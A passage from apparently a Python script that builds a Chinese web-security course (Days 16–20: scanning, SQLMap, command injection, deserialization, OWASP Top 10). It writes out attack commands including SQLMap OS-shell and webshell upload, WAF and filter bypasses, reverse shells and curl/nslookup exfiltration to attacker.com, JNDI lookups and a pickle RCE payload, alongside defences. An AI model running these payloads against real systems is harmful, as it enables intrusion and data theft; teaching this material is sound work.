CVSS v3.1 Score = f(Base Metrics + Temporal Metrics + Environmental Metrics)

Base Metrics (基础指标):
├── Exploitability: 攻击向量(AV) + 攻击复杂度(AC) + 权限要求(PR) + 用户交互(UI)
└── Impact: 机密性(C) + 完整性(I) + 可用性(A)

严重程度分级:
  0.0        → None
  0.1 - 3.9  → Low（低危）
  4.0 - 6.9  → Medium（中危）
  7.0 - 8.9  → High（高危）
  9.0 - 10.0 → Critical（严重）
```

> **🔑 高分考点**：CVSS 是漏洞评估的**通用语言**——帮助安全团队统一漏洞严重性认知，不依赖个人主观判断。

### 漏洞优先级

除了 CVSS 评分，还需考虑：
- **EPSS**（漏洞利用预测评分）：该漏洞被利用的概率
- **KEV**（已知被利用漏洞目录，CISA）：已在野利用的漏洞
- **资产重要性**：漏洞所在系统的业务价值
- **暴露面**：该漏洞是否可从互联网访问"""),
    ],
    [
        ('认证 vs 非认证扫描', '⭐⭐⭐⭐⭐', '中', '认证扫描更深更准；非认证扫描模拟外部攻击者视角'),
        ('CVSS 评分体系', '⭐⭐⭐⭐⭐', '中', 'Base+Temporal+Environmental；0-10分；9.0+为Critical'),
        ('Nessus 核心价值', '⭐⭐⭐⭐', '中', '180,000+插件、认证扫描、合规检查、报告生成'),
        ('Nuclei 特点', '⭐⭐⭐⭐', '中', 'YAML模板、社区驱动、高性能、可自定义模板'),
        ('漏洞优先级', '⭐⭐⭐⭐', '中', '不仅看CVSS——还要考虑EPSS、KEV、资产重要性、暴露面'),
        ('漏洞扫描局限性', '⭐⭐⭐⭐', '中', '无法发现0day、业务逻辑漏洞；有误报需人工验证'),
    ],
    [
        ('漏洞评估三要素', '"CVSS打分、EPSS预测、KEV实锤"', 'CVSS=漏洞有多严重；EPSS=被利用概率；KEV=是否已在野外被攻击'),
        ('扫描器局限', '"扫描找已知，逻辑要靠人"', '自动化扫描器只能发现已知特征漏洞；业务逻辑漏洞、0day需要人工渗透测试'),
    ],
    [
        ('扫描就是渗透测试', '漏洞扫描≠渗透测试。扫描是自动化检查已知漏洞；渗透测试是人工模拟攻击验证漏洞的可利用性和实际危害。'),
        ('CVSS 高分漏洞一定优先修复', '评分高但无法从互联网访问的漏洞，优先级可能低于一个可从外部访问的中危漏洞。修复优先级需要上下文判断。'),
    ],
    [
        '在本地搭建 Nessus 或 OpenVAS，对你的家庭网络进行一次完整扫描——了解"攻击者视角"。',
        '学习编写 Nuclei 模板——从一个简单的GET请求开始，逐步学习matchers和extractors。',
        '使用 CVSS Calculator (https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator) 亲手计算一个漏洞的评分。',
        '订阅 CISA KEV 列表 (https://www.cisa.gov/known-exploited-vulnerabilities-catalog) 获取在野利用漏洞情报。',
    ],
    '漏洞扫描就像给系统做"CT检查"——它告诉你哪里有"病灶"。但只有理解了扫描结果的真正含义、知道如何验证和排序，你才能从"一堆报告"变为"一份可执行的行动计划"。第十六天，你学会了"诊断"系统的能力。',
)

print(f"  [BASIC] Day 16 done, total lines so far: {total_lines}")
sys.stdout.flush()

# Day 17: SQLMap进阶使用
make_day('basic', 17, 'SQLMap进阶使用', '中高级', '40',
    'SQLMap 是 SQL 注入自动化利用的"瑞士军刀"——从基础的布尔盲注到高级的 OS Shell，从 WAF 绕过到二阶注入，SQLMap 提供了完整的注入利用链。本章以大量实战命令讲解 SQLMap 的核心参数、Tamper 脚本、数据外带技术和防御规避。',
    [
        S('一、SQLMap 核心参数', '一sqlmap-核心参数', r"""## 一、SQLMap 核心参数

```bash
# 基础探测
sqlmap -u "http://target/page?id=1"                          # GET 参数探测
sqlmap -u "http://target/login" --data="user=admin&pass=123" # POST 参数探测
sqlmap -r request.txt -p id                                   # 从Burp请求文件指定参数

# 指定数据库
sqlmap -u "http://target?id=1" --dbs                          # 枚举数据库
sqlmap -u "http://target?id=1" -D dbname --tables             # 枚举表
sqlmap -u "http://target?id=1" -D dbname -T users --columns   # 枚举列
sqlmap -u "http://target?id=1" -D dbname -T users --dump      # 导出数据

# 注入技术选择
--technique=BEUSTQ   # 全部技术 (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline)
--technique=B        # 仅布尔盲注
--technique=U        # 仅联合查询
--technique=T        # 仅时间盲注

# 指定后端DBMS
--dbms=mysql         # MySQL
--dbms=mssql         # Microsoft SQL Server
--dbms=oracle        # Oracle
--dbms=postgresql    # PostgreSQL

# 关键实战参数
--batch              # 所有选项用默认值（自动化）
--random-agent       # 随机User-Agent
--level=5 --risk=3   # 最高测试深度和风险级别
--threads=10         # 10线程并发
--time-sec=2         # 时间盲注响应判定阈值（秒）
--tamper=space2comment  # 使用 Tamper 脚本绕过 WAF
```"""),
        S('二、SQLMap Tamper 脚本', '二sqlmap-tamper-脚本', r"""## 二、Tamper 脚本绕过 WAF

Tamper 脚本在发送请求前自动修改 Payload，实现 WAF/IPS 绕过：

```bash
# 常用 Tamper 脚本
--tamper=space2comment       # 空格→/**/
--tamper=between             # 用 BETWEEN 替代比较符
--tamper=charunicodeencode   # Unicode 编码
--tamper=charencode          # URL 编码
--tamper=randomcase          # 随机大小写
--tamper=apostrophemask      # 单引号→UTF-8编码
--tamper=versionedmorekeywords  # 版本注释包裹关键字 /*!UNION*/

# 组合多个 Tamper
--tamper="space2comment,between,randomcase,charencode"

# WAF 特定 Tamper 组合
# ModSecurity: space2comment,randomcase,between
# CloudFlare:  between,randomcase,space2comment,space2plus
# Imperva:     charunicodeencode,chardoubleencode
```

### 编写自定义 Tamper

```python
# tamper/my_tamper.py
def tamper(payload, **kwargs):
    # 自定义转换逻辑
    return payload.replace("SELECT", "/*!50000SeLeCt*/")
```
```bash
sqlmap -u "target?id=1" --tamper=my_tamper
```"""),
        S('三、SQLMap 高级利用', '三sqlmap-高级利用', r"""## 三、高级利用：OS Shell 与文件操作

```bash
# 1. 获取 OS Shell（需要 stacked queries 或 outfile 权限）
sqlmap -u "http://target?id=1" --os-shell
# 选择语言(PHP/ASP/JSP) → 自动上传 stager → 获得命令执行

# 2. 文件读取
sqlmap -u "http://target?id=1" --file-read="/etc/passwd"

# 3. 文件上传（上传 WebShell）
sqlmap -u "http://target?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# 4. 注册表读取（Windows/MSSQL）
sqlmap -u "http://target?id=1" --reg-read="HKEY_LOCAL_MACHINE\SOFTWARE\..."

# 5. 执行任意 SQL
sqlmap -u "http://target?id=1" --sql-query="SELECT LOAD_FILE('/etc/passwd')"

# 6. 数据外带（DNS/HTTP）
sqlmap -u "http://target?id=1" --dns-domain=attacker.com   # DNS外带
sqlmap -u "http://target?id=1" --hex                        # Hex编码输出
```

### 二阶 SQL 注入

```bash
# 二阶注入：payload先存储，后在另一页面触发
sqlmap -u "http://target/view?id=1" --second-url="http://target/create"
# --second-url 指定 payload 将被存储的页面

# Cookie 注入
sqlmap -u "http://target/" --cookie="id=1" --level=2
```"""),
        S('四、SQLMap 实战技巧', '四sqlmap-实战技巧', r"""## 四、实战技巧与优化

```bash
# 1. 复制浏览器/Cookie/Session 完整上下文
sqlmap -u "http://target?id=1" --cookie="PHPSESSID=abc; token=xyz" --headers="X-API-Key: 123"

# 2. 代理到 Burp 观察流量
sqlmap -u "http://target?id=1" --proxy="http://127.0.0.1:8080"

# 3. 从 Burp 日志读取请求
sqlmap -l burp.log --scope="target.com"

# 4. 优化盲注速度
sqlmap -u "target?id=1" --technique=B --string="Welcome"    # 页面有特定字符串=TRUE
sqlmap -u "target?id=1" --technique=B --not-string="Error"  # 页面无特定字符串=TRUE

# 5. 从文件批量测试
sqlmap -m targets.txt --batch --smart

# 6. 使用 SOCKS 代理/Tor
sqlmap -u "target" --proxy="socks5://127.0.0.1:9050"
```"""),
        S('五、SQLMap 检测规避', '五sqlmap-检测规避', r"""## 五、SQLMap 检测规避

```bash
# 降低检测频率
sqlmap -u "target" --delay=2              # 每次请求间隔2秒
sqlmap -u "target" --timeout=10           # 10秒超时
sqlmap -u "target" --retries=2            # 失败重试2次

# 伪装流量
sqlmap -u "target" --random-agent         # 随机UA
sqlmap -u "target" --referer="https://google.com/search?q=site"  # 伪造Referer
sqlmap -u "target" --host="example.com"   # 伪造Host头

# 综合躲避：慢速+伪装+分段
sqlmap -u "target?id=1" \
    --delay=3 \
    --random-agent \
    --tamper=space2comment,between \
    --technique=B \
    --level=3 --risk=1

# 注意：--csrf-token 和 --csrf-url（处理有 CSRF 保护的注入）
sqlmap -u "target?id=1" --csrf-token="csrf_token" --csrf-url="http://target/page"
```"""),
    ],
    [
        ('SQLMap 核心技术选择', '⭐⭐⭐⭐⭐', '中', 'B=Boolean/E=Error/U=Union/S=Stacked/T=Time/Q=Inline query'),
        ('Tamper 脚本价值', '⭐⭐⭐⭐⭐', '中', '编码/混淆/拆分Payload→绕过WAF/IPS签名检测'),
        ('OS Shell 条件', '⭐⭐⭐⭐', '高', '需stacked queries或outfile写权限+DBA权限+知道Web绝对路径'),
        ('二阶注入检测', '⭐⭐⭐⭐', '高', '用--second-url指定payload触发页面'),
        ('--level --risk', '⭐⭐⭐⭐', '低', 'level=1-5测试深度；risk=1-3风险等级(3可能UPDATE数据)'),
        ('检测规避', '⭐⭐⭐⭐', '中', '--delay/--random-agent/--tamper/代理链'),
    ],
    [
        ('SQLMap 使用口诀', '"先-u后--data，--dbs看库→--tables看表→--dump全导"', '参数顺序就是攻击步骤：确定注入点→枚举数据库→枚举表→导出数据'),
    ],
    [
        ('SQLMap 找到注入点就成功了', '找到注入点只是开始。真正有危害的是能获取数据、写入文件或执行命令。'),
        ('--level 5 --risk 3 就应该一直用', '高风险可能导致UPDATE/DELETE操作修改数据库。测试生产环境应谨慎选择--risk参数。'),
    ],
    [
        '在 DVWA/SQLi-Labs 靶场中使用 SQLMap，从 Level 1 到 Level 65+ 逐一通关。',
        '学习编写自定义 Tamper 脚本——找一个 WAF 并将其绕过过程固化为 Tamper。',
        '用 --proxy 参数将 SQLMap 流量转发到 Burp Suite，观察每个探测请求和响应的细节。',
        '阅读 SQLMap 官方 Wiki：https://github.com/sqlmapproject/sqlmap/wiki',
    ],
    'SQLMap 的强大之处不在于"自动发现"——而在于当你理解了 SQL 注入原理后，它能帮你把"手工需要 4 小时"的事情压缩到 4 分钟。第十七天，你掌握了 SQL 注入的"机械化部队"。',
)

print(f"  [BASIC] Day 17 done, total lines so far: {total_lines}")
sys.stdout.flush()

# Day 18: 命令注入与代码注入
make_day('basic', 18, '命令注入与代码注入', '中级', '35',
    '命令注入（Command Injection）让攻击者在服务器上执行任意系统命令，危害等级仅次于 RCE 漏洞。本章详解 OS 命令注入的各种形式（管道符、反引号、$()）、绕过黑名单技巧、盲命令注入与时间延迟检测，以及代码注入（eval、反序列化）的基础概念。',
    [
        S('一、命令注入原理', '一命令注入原理', r"""## 一、命令注入原理

当应用程序将用户输入直接拼接到系统命令中，攻击者可以通过命令分隔符注入额外命令：

```php
<?php
// 漏洞代码
$ip = $_GET['ip'];
system("ping -c 1 " . $ip);
// 访问: http://target/ping?ip=127.0.0.1;cat /etc/passwd
// 执行: ping -c 1 127.0.0.1; cat /etc/passwd
?>
```

### 命令分隔符

| 分隔符 | 作用 | Windows | Linux |
|:---|:---|:---:|:---:|
| `;` | 顺序执行 | ❌ | ✅ |
| `&&` | 前一命令成功则执行 | ✅ | ✅ |
| `\|\|` | 前一命令失败则执行 | ✅ | ✅ |
| `\|` | 管道 | ✅ | ✅ |
| `` ` `` | 命令替换 | ❌ | ✅ |
| `$()` | 命令替换 | ❌ | ✅ |
| `%0a` | 换行符 | ❌ | ✅ |
| `&` | 后台执行(Linux)/命令分隔(Win) | ✅ | ✅ |

```bash
# 各种注入 Payload
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 `whoami`
127.0.0.1 $(whoami)
127.0.0.1%0awhoami
```"""),
        S('二、命令注入绕过', '二命令注入绕过', r"""## 二、命令注入绕过技术

### 空格绕过

```bash
# 空格被过滤时的替代方案
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
X=$'cat\x20/etc/passwd'&&$X   # $'...' bash扩展
```

### 关键字过滤绕过

```bash
# cat 被过滤
/bin/cat /etc/passwd
c''at /etc/passwd       # 空引号插入
c\at /etc/passwd         # 反斜杠
/usr/bin/cat /etc/passwd
c$@at /etc/passwd        # $@扩展为空

# 空格+关键字同时过滤
{cat,/etc/passwd}
cat$IFS$9/etc/passwd    # $9为shell参数(通常为空)
```

### 黑名单绕过汇总

```bash
# 通配符
/bin/c?t /etc/passw*    # ?匹配单个字符, *匹配多个

# Base64 编码执行
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
`echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d`

# Hex/Octal 编码
$'\x63\x61\x74' /etc/passwd    # cat的Hex编码

# 环境变量拼接
a=c; b=at; $a$b /etc/passwd
```"""),
        S('三、盲命令注入', '三盲命令注入', r"""## 三、盲命令注入

当命令输出不可见时，通过时间延迟或带外通道（OOB）确认注入：

```bash
# 时间延迟检测
; sleep 5              # 响应延迟5秒=注入成功
; ping -c 5 127.0.0.1  # 服务器端延迟10秒

# DNS 外带（OOB）
; nslookup `whoami`.attacker.com      # 通过DNS泄露命令输出
; curl http://attacker.com/?c=`id`    # 通过HTTP泄露

# 文件写入（间接确认）
; echo "test" > /tmp/pwned
; curl http://target/?file=/tmp/pwned  # 检查文件是否存在
```

### 带外数据外带实例

```bash
# 攻击者服务器监听
nc -lvnp 4444

# 注入 Payload
; nc attacker.com 4444 -e /bin/bash       # 反向Shell
; bash -i >& /dev/tcp/attacker/4444 0>&1  # Bash反弹
; curl http://attacker.com/$(id|base64)   # 数据外带
```"""),
        S('四、代码注入', '四代码注入', r"""## 四、代码注入

### PHP eval() 注入

```php
<?php
eval("\$result = " . $_GET['expr'] . ";");
// 攻击: ?expr=system('id')
// 或:  ?expr=1; system('id')
?>

<?php
assert($_GET['cmd']);
// 攻击: ?cmd=system('id')
?>
```

### Python eval/exec 注入

```python
# 漏洞代码
result = eval(request.GET.get('expr'))

# 攻击 payload
?expr=__import__('os').system('id')
?expr=open('/etc/passwd').read()
```

### 模板注入 (SSTI)

```python
# Jinja2 模板注入
# 模板: {{ user_input }}
# 攻击: {{ ''.__class__.__mro__[2].__subclasses__()[X](...) }}
# 最终可达到 RCE
```

```bash
# SSTI 检测 Payload
{{7*7}}                    # 输出49 → Jinja2/Twig
${7*7}                     # 输出49 → Freemarker
<%= 7*7 %>                 # 输出49 → ERB
#{7*7}                     # 输出49 → Thymeleaf
```"""),
        S('五、防御方案', '五防御方案', r"""## 五、防御方案

```text
命令注入防御（优先级从高到低）:

1. 【最推荐】避免调用系统命令
   使用语言内置库替代 system()/exec()/popen()
   PHP: 用 fsockopen() 替代 ping 命令
   Python: 用 subprocess 但参数化数组

2. 参数化/白名单
   subprocess.run(['ping', '-c', '1', validated_ip], shell=False)
   shell=False → 不经过shell解析，元字符失效

3. 输入验证
   IP地址: 正则严格匹配 ^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$
   文件名: 仅允许字母数字和指定字符

4. 最小权限
   以www-data/nobody运行，限制sudo权限
   SELinux/AppArmor 限制进程能力
```

```python
import subprocess, re, ipaddress

def safe_ping(ip):
    # 1. 输入验证
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        raise ValueError("Invalid IP")
    # 2. 参数化调用（shell=False）
    result = subprocess.run(
        ['ping', '-c', '1', ip],
        capture_output=True, text=True, timeout=5, shell=False
    )
    return result.stdout
```"""),
    ],
    [
        ('命令分隔符', '⭐⭐⭐⭐⭐', '中', '; && || | ` $() %0a & 共8种'),
        ('空格绕过', '⭐⭐⭐⭐', '高', '${IFS}/<重定向/{cmd,args}/$IFS$9'),
        ('盲命令注入', '⭐⭐⭐⭐', '高', '时间延迟(sleep/ping)、DNS外带(nslookup)、HTTP外带(curl)'),
        ('黑名单绕过', '⭐⭐⭐⭐⭐', '高', '编码/通配符/引号插入/环境变量/Base64解码执行'),
        ('防御最佳实践', '⭐⭐⭐⭐⭐', '中', '避免系统命令→参数化(shell=False)→输入验证白名单→最小权限'),
        ('代码注入类型', '⭐⭐⭐⭐', '中', 'eval/assert/pickle反序列化/SSTI模板注入'),
    ],
    [
        ('命令分隔符口诀', '"分号与或管，反引换行美元括号"', '; && || | ` %0a $() & — Linux下最主要的是; && || | ` $()',
         'Windows下的分隔符较少：&& || & ；而%0a(换行)仅Linux有效'),
    ],
    [
        ('过滤了 ; 就安全', '还有 && || | %0a $() ``等6+种替代分隔符。黑名单过滤几乎不可能全面覆盖。'),
        ('用 escapeshellcmd 就够了', 'escapeshellcmd 转义整个命令字符串中的元字符，但若传入的是命令参数而非完整命令，应用 escapeshellarg。且最佳方案是避免使用shell函数。'),
    ],
    [
        '在 DVWA Command Injection 中从 Low 到 Impossible 逐级练习。',
        '使用 Commix (https://github.com/commixproject/commix) 自动化命令注入测试。',
        '手工练习盲命令注入：sleep 检测→ ping 延迟→ DNS 外带→ 数据外带。',
        '在 Python 实践中将不安全的 os.system() 重构为 subprocess.run(shell=False)。',
    ],
    '命令注入是一把"万能钥匙"——一旦攻击者能与系统 Shell 对话，整个服务器就敞开了大门。防御的核心不是"过滤掉所有危险字符"，而是"永远不要用字符串拼接来构造系统命令"。第十八天，你学会了守护服务器的"命令行"。',
)

print(f"  [BASIC] Day 18 done, total lines so far: {total_lines}")
sys.stdout.flush()

# Day 19: 反序列化漏洞
make_day('basic', 19, '反序列化漏洞', '高级', '40',
    '反序列化漏洞常年位列 OWASP Top 10，以其利用链复杂、危害严重著称。从 PHP 原生反序列化到 Java Fastjson/Shiro，从 Python Pickle 到 .NET BinaryFormatter——几乎每种语言都有反序列化安全问题。2017年 Equifax 数据泄露（Apache Struts2）导致1.43亿用户数据泄露。本章系统讲解反序列化漏洞的利用链、POP Gadget 构造、ysoserial 工具和防御方案。',
    [
        S('一、反序列化基础', '一反序列化基础', r"""## 一、反序列化基础

序列化是将对象转换为可存储/传输的字节流；反序列化是将字节流恢复为对象。不安全的反序列化可在恢复对象时执行攻击者构造的代码。

```php
<?php
// 漏洞代码
$data = unserialize($_COOKIE['user_data']);
// Cookie: user_data=O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"is_admin";b:1;}

// 攻击者修改了 is_admin=true → 权限提升
?>
```

| 语言 | 序列化函数 | 漏洞利用链工具 |
|:---|:---|:---|
| **PHP** | `unserialize()` | PHPGGC (PHP Generic Gadget Chains) |
| **Java** | `ObjectInputStream.readObject()` | ysoserial / JNDI注入 |
| **Python** | `pickle.loads()` | 直接 RCE（无gadget链需求!） |
| **.NET** | `BinaryFormatter.Deserialize()` | ysoserial.net |
| **Ruby** | `Marshal.load()` | 通用 Gadget 链 |
| **Node.js** | `node-serialize` `unserialize()` | IIFE 函数注入 |

> **🔑 高分考点**：Python pickle 无需 gadget 链即可RCE——因为 pickle 允许 `__reduce__()` 方法直接指定要执行的函数和参数。这是与其他语言的关键区别。"""),
        S('二、PHP 反序列化', '二php-反序列化', r"""## 二、PHP 反序列化与 POP 链

### POP Gadget Chain（属性导向编程）

攻击者在目标代码中寻找一组"小工具类"，将它们串联成一个调用链，最终实现 RCE 或任意文件操作：

```php
<?php
// Gadget 1: 自动加载器
class FileLoader {
    public $filename;
    function __destruct() {
        include($this->filename);  // 文件包含！
    }
}
// Gadget 2: ...
// 最终 Payload 可以触发整个链

// 利用 PHPGGC 生成 Payload
// phpggc Monolog/RCE1 system 'id' -b
```

### 常见魔术方法

| 魔术方法 | 触发时机 | 利用价值 |
|:---|:---|:---|
| `__destruct()` | 对象销毁 | ⭐⭐⭐⭐⭐ 最常见入口 |
| `__wakeup()` | unserialize() 后 | ⭐⭐⭐⭐⭐ 反序列化专用 |
| `__toString()` | 对象被当字符串 | ⭐⭐⭐⭐ |
| `__call()` | 调用不存在方法 | ⭐⭐⭐ |
| `__get()/__set()` | 读写不可访问属性 | ⭐⭐⭐ |

```bash
# PHPGGC 使用
phpggc -l                    # 列出所有链
phpggc Laravel/RCE1 system id
phpggc -b Monolog/RCE1 system 'cat /etc/passwd'
```"""),
        S('三、Java 反序列化', '三java-反序列化', r"""## 三、Java 反序列化

### 经典漏洞框架

| 框架/组件 | 漏洞 | CVE |
|:---|:---|:---|
| **Apache Struts2** | 反序列化RCE | S2-045, S2-057, S2-062 |
| **Fastjson** | 反序列化RCE | CVE-2022-25845等 |
| **Apache Shiro** | RememberMe 反序列化 | CVE-2016-4437 (Shiro-550) |
| **WebLogic** | T3/IIOP 反序列化 | CVE-2020-2555等 |
| **JBoss** | JMXInvokerServlet | CVE-2015-7501 |
| **Spring Cloud** | Gateway RCE | CVE-2022-22947 |
| **Log4j2** | JNDI注入→反序列化 | CVE-2021-44228 |

```bash
# ysoserial 使用
java -jar ysoserial.jar CommonsCollections1 "id" | base64

# Shiro-550 检测与利用
python3 shiro_attack.py -u http://target -k "kPH+bIxk5D2deZiIxcaaaA=="
```

### JNDI 注入

```java
// 漏洞代码
InitialContext ctx = new InitialContext();
ctx.lookup(userInput);  // 用户可控!
// 攻击: lookup("ldap://attacker.com/EvilObject")
// → 加载远程恶意对象 → RCE
```"""),
        S('四、Python 反序列化', '四python-反序列化', r"""## 四、Python Pickle 反序列化

```python
# 漏洞代码
import pickle, base64
data = base64.b64decode(request.cookies.get('session'))
user = pickle.loads(data)  # 直接RCE!

# 攻击 Payload 生成
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
# 将 payload 放入 Cookie → pickle.loads() → os.system('id') 执行
```

> Pickle的 `__reduce__()` 可以直接指定要执行的函数，不需要其他 gadget 链配合。这是 Python 反序列化最危险的特征。

### YAML 反序列化

```python
import yaml
# 危险：PyYAML < 5.1 使用默认 Loader
yaml.load(user_input)  # 可RCE!
# 安全：使用 SafeLoader
yaml.safe_load(user_input)  # 仅反序列化基础类型
```"""),
        S('五、反序列化防御', '五反序列化防御', r"""## 五、反序列化防御方案

```text
防御方案（优先级从高到低）:

1. 【最佳】不使用原生序列化
   → 使用 JSON/Protocol Buffers/MessagePack
   → 这些格式只能表示数据，不能表示对象

2. 签名+加密
   → 序列化数据加 HMAC 签名（防篡改）
   → 发现签名无效→拒绝反序列化

3. 类型白名单
   → Java: 实现 ObjectInputFilter
   → PHP: allowed_classes 参数

4. 运行时防护
   → RASP（Runtime Application Self-Protection）
   → WAF 反序列化检测规则
```

```java
// Java 反序列化过滤器
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.example.safe.*;!*"
);
ObjectInputStream ois = new ObjectInputStream(bais);
ois.setObjectInputFilter(filter);
```"""),
    ],
    [
        ('反序列化本质', '⭐⭐⭐⭐⭐', '高', '不可信数据反序列化→POP链→代码执行'),
        ('Python pickle 特殊性', '⭐⭐⭐⭐⭐', '中', '__reduce__()直接指定函数执行；不需要POP链'),
        ('Java ysoserial', '⭐⭐⭐⭐⭐', '高', '利用库利用链(CommonsCollections/Spring等)生成Payload'),
        ('PHP 魔术方法', '⭐⭐⭐⭐⭐', '中', '__destruct/__wakeup/__toString→POP链入口'),
        ('Log4j/Log4Shell', '⭐⭐⭐⭐⭐', '高', 'CVE-2021-44228 JNDI注入→反序列化RCE'),
        ('最佳防御', '⭐⭐⭐⭐', '中', '不用原生序列化(用JSON/Protobuf)；签名+HMAC；类型白名单'),
    ],
    [
        ('反序列化危害', '"序列化是编码，反序列化是解码——但解码过程中可以执行代码"', '与base64/json不同，原生序列化格式可以表示对象和执行逻辑',
         '反序列化漏洞的特殊之处在于：攻击payload不需要是"恶意代码"，而是"合法的序列化数据"——只是数据内容被精心构造'),
    ],
    [
        ('反序列化漏洞很少见', '反序列化漏洞在 Java/PHP/Python/.NET 全面存在，OWASP Top 10 2021 排名第8。Log4Shell (CVE-2021-44228) 就利用了 JNDI 注入实现反序列化RCE。'),
        ('JSON 替代序列化就完全安全', 'JSON 本身不包含执行逻辑，比原生序列化安全。但如果 JSON 反序列化后调用与对象构造相关的代码，仍可能被利用（如 Jackson polymorphic deserialization）。'),
    ],
    [
        '在 VulHub 靶场中复现 Shiro-550/721 (CVE-2016-4437) 反序列化漏洞。',
        '使用 ysoserial 生成 Payload——理解每个利用链利用的是哪个库的哪些类。',
        '实践 PHPGGC 生成 PHP Payload，用 PHP 反序列化漏洞靶场测试。',
        '阅读 Apache Log4j 官方关于 Log4Shell (CVE-2021-44228) 的详细分析报告。',
    ],
    '反序列化漏洞是最"烧脑"的漏洞类型——它需要你理解编程语言的内部机制、追踪多层的 POP Gadget 链、甚至组合多个看似无害的类。但一旦掌握了它，你就跃升为安全研究者中的"高阶玩家"。第十九天，你踏进了安全研究的深水区。',
)

print(f"  [BASIC] Day 19 done, total lines so far: {total_lines}")
sys.stdout.flush()

# Day 20: OWASP Top 10 概览
make_day('basic', 20, 'OWASP Top 10 概览', '中级', '35',
    'OWASP Top 10 是 Web 应用安全风险的"行业圣经"——每3-4年更新一次，总结了全球安全专家公认的十大最严重 Web 安全风险。2021版引入了不安全的软件设计、软件和数据完整性故障等新类别。本章逐项深解每一项风险的定义、攻击场景、真实案例和防御方案。',
    [
        S('一、OWASP Top 10 2021 全景', '一owasp-top-10-2021-全景', r"""## 一、OWASP Top 10 2021 全景

```
OWASP Top 10 2021 (vs 2017 变化):

A01: Broken Access Control ← ↑ (原A05) 越权访问控制
A02: Cryptographic Failures ← 更名 (原A03 敏感数据泄露)
A03: Injection ← ↓ (原A01 注入) 
A04: Insecure Design ← 🆕 不安全设计
A05: Security Misconfiguration ← ↑ (原A06 安全配置错误)
A06: Vulnerable Components ← ↑ (原A09 已知漏洞组件)
A07: Identification Failures ← 更名 (原A02 认证失效)
A08: Software Integrity Failures ← 🆕 软件完整性故障
A09: Security Logging Failures ← ↑ (原A10 日志监控不足)
A10: SSRF ← 🆕 服务端请求伪造(原独立类别)
```

> **🔑 高分考点**：2021版最大的变化——新增3个类别(A04/A08/A10)，删除了 XXE (原A04) 和 Insecure Deserialization (原A08，但并入了A08)。注入从 #1 降到 #3。"""),
        S('二、A01-A05 详解', '二a01-a05-详解', r"""## 二、A01-A05 详解

### A01: Broken Access Control（越权访问控制）

```
风险：未实施最小权限原则
├── 水平越权（A用户访问B的数据）
├── 垂直越权（普通用户做管理员操作）
├── CORS 配置错误
├── 目录遍历
└── JWT 验证缺失

典型场景：/api/users/42 → 改42为41即可查看他人信息
防御：服务端每次请求验证权限 + 使用UUID + 拒绝默认访问
```

### A02: Cryptographic Failures（加密失败）

```
风险：敏感数据保护不足
├── 明文传输（HTTP）
├── 弱密码算法（MD5, DES, RC4）
├── 硬编码密钥
├── 弱随机数生成
├── 未正确验证证书

典型案例：数据库密码明文存储 → 数据库泄露 → 全部数据暴露
防御：TLS 1.2+/AES-256-GCM/bcrypt/HSTS/CSP/密钥管理服务
```

### A03: Injection（注入）

```
风险：用户输入被解释为代码
├── SQL注入（#3但仍高危）
├── XSS（通过脚本注入）
├── OS命令注入
├── LDAP注入
├── XPath注入

经典案例：Sony Pictures (2011) —— SQL注入泄露100万+用户数据
防御：参数化查询/ORM/输入验证/输出编码/WAF
```

### A04: Insecure Design（不安全设计）🆕

```
风险：威胁建模缺失，安全需求未融入设计阶段
├── 缺少速率限制→暴力破解
├── 无MFA→凭据被盗即沦陷
├── 密码重置逻辑缺陷→账户接管
├── 业务流程跳过→0元购

防御：威胁建模/安全设计模式/安全SDLC/架构评审
```

### A05: Security Misconfiguration（安全配置错误）

```
风险：默认/不完整的配置
├── 默认密码未改
├── 目录列表开启
├── 错误信息泄露堆栈
├── 不必要的功能启用
├── 云存储桶公开访问

典型：2017年AWS S3桶公开导致数百万Verizon/Booz Allen数据泄露
防御：硬化基线/自动化配置检查/定期审计/最小功能原则
```"""),
        S('三、A06-A10 详解', '三a06-a10-详解', r"""## 三、A06-A10 详解

### A06: Vulnerable Components（已知漏洞组件）

```
风险：使用包含已知漏洞的第三方库/框架

案例：
├── Log4Shell (CVE-2021-44228) - Log4j 2.x 全版本
├── Spring4Shell (CVE-2022-22965) - Spring Framework
├── Fastjson多个反序列化漏洞

防御：SBOM清单/Dependabot/Snyk/OWASP Dependency-Check/CVE监控
```

### A07: Identification Failures（认证失效）

```
风险：身份验证、会话管理缺陷
├── 弱密码允许（123456/admin）
├── 暴力破解无防护
├── Session ID暴露在URL
├── 无MFA
├── Session不过期

防御：MFA/密码强度策略/速率限制/安全Session管理/BCrypt
```

### A08: Software Integrity Failures（软件完整性故障）🆕

```
风险：软件更新、CI/CD管道中的完整性缺失
├── 未签名更新→供应链攻击
├── CI/CD被入侵→恶意代码注入
├── 未验证依赖完整性

SolarWinds (2020): 攻击者入侵CI/CD→注入木马→18,000+组织受影响
防御：代码签名/SBOM/依赖锁定/CI/CD安全审计
```

### A09: Security Logging Failures（日志监控不足）

```
风险：缺乏日志记录和监控
├── 无登录失败日志→暴力破解无感知
├── 无审计日志→无法溯源
├── 事件未告警→攻击持续数月未被发现

平均发现时间：287天（IBM Ponemon 2023报告）
防御：SIEM/日志集中/告警规则/保留策略/定期审计
```

### A10: SSRF（服务端请求伪造）🆕

```
风险：攻击者通过服务器发起对内网的请求
→ 读云元数据(AWS/GCP/Azure密钥)
→ 攻击内网未认证服务
→ 端口扫描

防御：URL白名单/禁用file/gopher/dict协议/DNS解析后IP检查
```"""),
        S('四、OWASP Top 10 联动关系', '四owasp-top-10-联动关系', r"""## 四、Top 10 安全风险的联动

```
             ┌──────────────────┐
             │ A03: Injection    │──→ SQLi获取数据 → A02 加密失效(明文存储)
             │ A10: SSRF         │──→ 访问内网 → 内网弱配置 A05
